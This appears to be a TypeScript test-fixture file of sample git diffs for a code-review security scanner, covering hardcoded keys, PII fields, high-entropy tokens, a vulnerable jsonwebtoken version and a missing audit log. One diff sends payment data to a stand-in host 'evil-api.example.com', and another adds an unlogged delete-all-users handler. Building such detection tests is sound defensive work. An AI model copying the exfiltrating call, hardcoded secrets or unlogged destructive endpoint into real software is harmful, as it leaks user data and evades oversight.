export const SECRET_DIFF = `diff --git a/src/config.ts b/src/config.ts
--- a/src/config.ts
+++ b/src/config.ts
@@ -1,3 +1,4 @@
 export const config = {
-  apiKey: process.env.API_KEY,
+  apiKey: 'sk-live-abc123def456ghi789',
   port: 3000,
   databaseUrl: process.env.DATABASE_URL,
 };
`;

export const PII_DIFF = `diff --git a/src/models/user.ts b/src/models/user.ts
--- a/src/models/user.ts
+++ b/src/models/user.ts
@@ -5,6 +5,10 @@ model User {
   id: string;
   name: string;
+  email: string;
+  ssn: string;
+  phone: string;
+  address: string;
   createdAt: Date;
 }
`;

export const OUTBOUND_HTTP_DIFF = `diff --git a/src/services/payment.ts b/src/services/payment.ts
--- a/src/services/payment.ts
+++ b/src/services/payment.ts
@@ -1,4 +1,8 @@
 import { fetch } from 'undici';

+async function processPayment(data: any) {
+  const result = await fetch('https://evil-api.example.com/charge', {
+    method: 'POST',
+    body: JSON.stringify(data),
+  });
+  return result.json();
+}
+
 export async function getUser(id: string) {
   return fetch('https://api.github.com/users/' + id);
 }
`;

export const CLEAN_DIFF = `diff --git a/src/utils/helpers.ts b/src/utils/helpers.ts
--- a/src/utils/helpers.ts
+++ b/src/utils/helpers.ts
@@ -1,3 +1,5 @@
 export function formatDate(d: Date): string {
+  const pad = (n: number) => n.toString().padStart(2, '0');
   return d.toISOString();
 }
`;

// Feature 2: High-entropy secret that bypasses simple regex
export const ENTROPY_SECRET_DIFF = `diff --git a/src/secrets.ts b/src/secrets.ts
--- a/src/secrets.ts
+++ b/src/secrets.ts
@@ -1,3 +1,5 @@
 export const creds = {
-  token: process.env.SERVICE_TOKEN,
+  token: 'aB3xK9mP2qR7vN4wY8jF6hD1cG5sT0e',
   refreshInterval: 30000,
 };
`;

// Feature 2: Lockfile diff with known vulnerable dependency
export const DEPENDENCY_CVE_DIFF = `diff --git a/package-lock.json b/package-lock.json
--- a/package-lock.json
+++ b/package-lock.json
@@ -10,6 +10,10 @@
     "lodash": {
       "version": "4.17.15",
       "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.15.tgz"
     },
+    "jsonwebtoken": {
+      "version": "8.5.1",
+      "resolved": "https://registry.npmjs.org/jsonwebtoken/-/jsonwebtoken-8.5.1.tgz"
+    },
     "express": {
       "version": "4.18.2",
       "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz"
     }
`;

// Feature 2: Sensitive function without audit logging
export const AUDIT_MISSING_DIFF = `diff --git a/src/services/admin.ts b/src/services/admin.ts
--- a/src/services/admin.ts
+++ b/src/services/admin.ts
@@ -1,3 +1,7 @@
 import { Router } from 'express';

+async function deleteAllUsers(req: Request, res: Response) {
+  await db.user.deleteMany({});
+  res.json({ success: true });
+}
+
 export const router = Router();
`;

// Feature 2: Sensitive function WITH audit logging (should NOT flag)
export const AUDIT_PRESENT_DIFF = `diff --git a/src/services/admin.ts b/src/services/admin.ts
--- a/src/services/admin.ts
+++ b/src/services/admin.ts
@@ -1,3 +1,8 @@
 import { Router } from 'express';

+async function deleteAllUsers(req: Request, res: Response) {
+  auditLog.record('DELETE_ALL_USERS', req.user);
+  await db.user.deleteMany({});
+  res.json({ success: true });
+}
+
 export const router = Router();
`;

// Feature 2: Low-entropy string that should NOT trigger (e.g. a UUID or date)
export const LOW_ENTROPY_DIFF = `diff --git a/src/utils/id.ts b/src/utils/id.ts
--- a/src/utils/id.ts
+++ b/src/utils/id.ts
@@ -1,2 +1,3 @@
 export function generateId() {
+  return 'hello-world';
 }
`;

// Feature 3: Diff that should produce suggested fixes
export const SUGGESTION_DIFF = `diff --git a/src/config.ts b/src/config.ts
--- a/src/config.ts
+++ b/src/config.ts
@@ -1,5 +1,6 @@
 export const config = {
-  apiKey: process.env.API_KEY,
+  apiKey: 'sk-live-abc123def456ghi789',
   port: 3000,
 };
`;
